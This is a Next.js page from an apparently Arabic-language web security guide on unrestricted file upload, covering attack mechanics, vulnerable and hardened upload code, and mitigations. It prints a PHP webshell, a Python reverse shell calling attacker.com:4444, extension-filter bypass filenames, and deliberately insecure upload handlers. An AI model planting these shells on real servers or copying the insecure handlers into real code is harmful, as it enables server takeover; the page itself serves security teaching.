'use client'
import VulnerabilityLayout, { VulnSection, CodeBlock, InfoBox, ListItem } from '@/components/VulnerabilityLayout'
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'
import ShareButtons from '@/components/ShareButtons'

export default function FileUploadPage() {
  return (
    <VulnerabilityLayout
      icon="📁"
      titleAr="رفع الملفات غير الآمن"
      titleEn="Unrestricted File Upload"
      severity="critical"
      owasp="A4:2013"
    >
      <ShareButtons title="File Upload - رفع الملفات غير الآمن" url="https://web-security-guide.vercel.app/vulnerabilities/file-upload" />

      <VulnSection title="تعريف رفع الملفات غير الآمن" icon="📖">
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8' }}>
          رفع الملفات غير الآمن (Unrestricted File Upload) هو ثغرة أمنية تسمح للمهاجم برفع ملفات ضارة (مثل WebShells) إلى الخادم، مما قد يؤدي إلى تشغيل كود عشوائي أو الوصول غير المصرح به.
        </p>
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8', marginTop: '8px' }}>
          تحدث الثغرة عندما لا يتحقق التطبيق بشكل كافٍ من نوع ونوعية الملفات المرفوعة.
        </p>
      </VulnSection>

      <VulnSection title="كيف يعمل رفع الملفات غير الآمن" icon="🔍">
        <InfoBox type="info">
          <strong>آلية العمل:</strong>
        </InfoBox>
        <ListItem>يكتشف المهاجم نموذج رفع ملفات في التطبيق</ListItem>
        <ListItem>يرفع ملفاً ضاراً (مثل PHP shell أو Python reverse shell)</ListItem>
        <ListItem>يتم حفظ الملف على الخادم</ListItem>
        <ListItem>يتم تنفيذ الملف الضار عند الوصول إليه</ListItem>
      </VulnSection>

      <VulnSection title="أنواع الملفات الضارة" icon="🔍">
        <InfoBox type="warning">
          <strong>1. WebShells</strong> - ملفات تسمح بالتحكم في الخادم عن بُعد
        </InfoBox>
        <CodeBlock title="مثال على WebShell" code={`<?php
// PHP WebShell
if(isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>

<!-- أو بشكل أبسط -->
<?php system($_GET['cmd']); ?>`} />

        <InfoBox type="warning">
          <strong>2. Reverse Shells</strong> - ملفات تنشئ اتصالاً عكسياً للمهاجم
        </InfoBox>
        <CodeBlock title="مثال على Reverse Shell" code={`#!/bin/bash
# Python Reverse Shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"]);`} />

        <InfoBox type="danger">
          <strong>3. Malware</strong> - برامج ضارة يمكنها تثبيت نفسها
        </InfoBox>
        <CodeBlock title="أنواع Malware" code={`# صيغ ملفات خطيرة على Linux
.php, .php3, .php4, .php5, .phtml
.pl, .py, .rb, .cgi, .sh

# صيغ ملفات خطيرة على Windows
.asp, .aspx, .jsp, .jspx
.exe, .bat, .cmd, .com, .vbs

# صيغ ملفات مخفية
.jpg.php, .png.php
.php.jpg`} />
      </VulnSection>

      <VulnSection title="أمثلة على الهجمات" icon="💻">
        <CodeBlock title="1. رفع WebShell" code={`// رفع ملف PHP shell
// الملف: shell.php
<?php system($_GET['cmd']); ?>

// الوصول للملف
https://example.com/uploads/shell.php?cmd=whoami

// النتيجة: تنفيذ أوامر على الخادم`} />

        <CodeBlock title="2. رفع Reverse Shell" code={`// رفع ملف Python reverse shell
// الملف: reverse.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

// تشغيل الملف
python reverse.py

// النتيجة: اتصال عكسي للمهاجم`} />

        <CodeBlock title="3. تجاوز الفلاتر" code={`// تجاوز فلتر الامتداد
shell.php.jpg
shell.php%00.jpg
shell.php5
shell.phtml

// تجاوز فلتر المحتوى
# قم بتغيير Content-Type إلى image/jpeg
// مع الحفاظ على محتوى PHP

// تجاوز فلتر الحجم
# قم برفع ملف صغير أولاً ثم استبداله`} />
      </VulnSection>

      <VulnSection title="أمثلة كود مصاب ومحصن" icon="💻">
        <CodeBlock title="❌ كود مصاب" variant="vulnerable" code={`// PHP - كود مصاب
$target = "uploads/" . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target);

// Python - كود مصاب
file = request.files['file']
file.save(f'uploads/{file.filename}')

// Node.js - كود مصاب
app.post('/upload', (req, res) => {
  req.files.file.mv(\`./uploads/\${req.files.file.name}\`);
});`} />

        <CodeBlock title="✅ كود محصن" variant="secure" code={`// PHP - كود محصن
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];

$file_ext = strtolower(pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION));
$file_type = $_FILES["file"]["type"];

// التحقق من الامتداد
if (!in_array($file_ext, $allowed_extensions)) {
  die('Invalid file extension');
}

// التحقق من نوع المحتوى
if (!in_array($file_type, $allowed_types)) {
  die('Invalid file type');
}

// التحقق من أن المحتوى يطابق الامتداد
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES["file"]["tmp_name"]);
if (!in_array($mime, $allowed_types)) {
  die('Invalid file content');
}

// تغيير اسم الملف
$new_filename = uniqid() . '.' . $file_ext;
$target = "uploads/" . $new_filename;
move_uploaded_file($_FILES["file"]["tmp_name"], $target);

// Python - كود محصن
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}
ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

file = request.files['file']
if file and allowed_file(file.filename):
    filename = secure_filename(file.filename)
    file.save(f'uploads/{filename}')`} />
      </VulnSection>

      <VulnSection title="طرق الحماية" icon="🛡️">
        <InfoBox type="success">
          <strong>1. التحقق من نوع الملف</strong> - تحقق من امتداد الملف ونوع المحتوى
        </InfoBox>
        <ListItem>تحقق من الامتداد في القائمة البيضاء</ListItem>
        <ListItem>تحقق من Content-Type</ListItem>
        <ListItem>تحقق من محتوى الملف فعلياً (MIME type checking)</ListItem>

        <InfoBox type="success">
          <strong>2. تغيير اسم الملف</strong> - لا تعتمد على اسم الملف الأصلي
        </InfoBox>
        <ListItem>ولّد اسماً عشوائياً لكل ملف</ListItem>
        <ListItem>احفظ الامتداد فقط من الاسم الأصلي</ListItem>

        <InfoBox type="success">
          <strong>3. تحديد الموقع</strong> - احفظ الملفات خارج جذر الويب
        </InfoBox>
        <ListItem>لا تحفظ الملفات في مجلد public</ListItem>
        <ListItem>استخدم مجلد منفصل للملفات المرفوعة</ListItem>

        <InfoBox type="success">
          <strong>4. تعطيل تنفيذ PHP</strong> - عطل تنفيذ ملفات PHP في مجلد الرفع
        </InfoBox>
        <CodeBlock title="تعطيل تنفيذ PHP في .htaccess" code={`# في ملف .htaccess
php_flag engine off

# أو في Apache config
<Directory "uploads">
    php_flag engine off
</Directory>`} />
      </VulnSection>

      <VulnSection title="نصائح أمنية" icon="💡">
        <InfoBox type="info">
          <strong>القاعدة الذهبية:</strong> لا تثق أبداً بملفات المستخدمين
        </InfoBox>
        <ListItem>تحقق من نوع الملف ونوع المحتوى</ListItem>
        <ListItem>غيّر اسم الملف لكل ملف مرفوع</ListItem>
        <ListItem>احفظ الملفات خارج جذر الويب</ListItem>
        <ListItem>عطّل تنفيذ ملفات التشغيل في مجلد الرفع</ListItem>
        <ListItem>استخدم ماسح فيروسات للملفات المرفوعة</ListItem>
      </VulnSection>

      <VulnSection title="الأخطاء الشائعة" icon="⚠️">
        <InfoBox type="danger">
          <strong>❌ الاعتماد على Content-Type فقط</strong> - يمكن تزويره بسهولة
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ عدم تغيير اسم الملف</strong> - يمكن للمهاجم تخمين العنوان
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ حفظ الملفات في مجلد public</strong> - يمكن الوصول لها مباشرة من الويب
        </InfoBox>
      </VulnSection>

      <section className="mb-6">
        <LabsSection slug="file-upload" />
      </section>

      <section className="mb-6">
        <ToolsSection slug="file-upload" />
      </section>

      <section className="mb-6">
        <Quiz slug="file-upload" />
        <VideoSection slug="file-upload" />
      </section>
    </VulnerabilityLayout>
  )
}
